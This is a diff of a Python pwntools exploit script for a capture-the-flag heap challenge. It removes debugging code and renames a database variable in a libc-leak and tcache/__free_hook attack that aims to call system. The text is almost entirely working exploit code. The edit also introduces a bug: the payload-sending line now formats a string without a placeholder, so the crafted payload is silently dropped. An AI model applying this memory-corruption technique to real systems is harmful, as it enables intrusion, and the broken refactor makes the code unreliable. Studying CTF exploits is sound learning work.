@@ -9,21 +9,6 @@ def cmd(cmd_str):
 def pack(num):
     return check_output(["./pack",str(num)]).strip()
 
-def debug():
-    LIBC = get_PIE(p,17)
-    PIE = get_PIE(p)
-
-    free = LIBC + libc.symbols['free']
-    realloc = LIBC + libc.symbols['realloc']
-    script = ""
-    script += "b *0x%x\n"%free
-    script += "b *0x%x\n"%realloc
-
-    bp = [0x6192,0x773D] 
-    for x in bp:
-        script += "b *0x%x\n"%(PIE+x)
-    gdb.attach(p,gdbscript=script)
-
 if __name__ == "__main__":
     libc = ELF("./libc-2.27.so")
     p = remote("challenges.fbctf.com", 1337)
@@ -61,7 +46,6 @@ if __name__ == "__main__":
     LIBC = u64(data.ljust(8,"\x00")) + 0x7f8f4fadf000 - 0x7f8f4fecaca0
     log.info("LIBC: 0x%x"%LIBC)
 
-    # 0x000000000003e160 : xor ecx, ecx ; addsd xmm0, xmm0 ; mov dword ptr [rdi], ecx ; ret
     oneshot = LIBC + libc.symbols['gets']
 
     # use leaker to get vtable address
@@ -70,18 +54,16 @@ if __name__ == "__main__":
     cmd("store normaldb float 1337 {}".format(pack(oneshot)))
     cmd("store normaldb float 1234 {}".format(pack(oneshot_storage)))
 
-    DB_NAME = "db1"
-    cmd("create {}".format(DB_NAME)) 
+    cmd("create db") 
 
-    cmd("store {} int 1 1337".format(DB_NAME))
-    cmd("getter {} 1 2".format(DB_NAME))
-    p.sendline("echo {}".format("A"*0x10+p64(oneshot_storage_storage).strip("\x00")))
+    cmd("store db int 1 1337")
+    cmd("getter db 1 2")
+    p.sendline("echo db".format("A"*0x10+p64(oneshot_storage_storage).strip("\x00")))
     p.sendline("empty")
   
-    cmd("store {} int 1 1337".format(DB_NAME))
+    cmd("store db int 1 1337")
     cmd("delete normaldb 1234")
-    #gdb.attach(p,gdbscript="b * 0x%x"%oneshot)
-    p.sendline("print db1")
+    p.sendline("print db")
     # now using gets we can overwrite the next tcache entry
     free_hook = LIBC + libc.symbols['__free_hook']
     system = LIBC + libc.symbols['system']
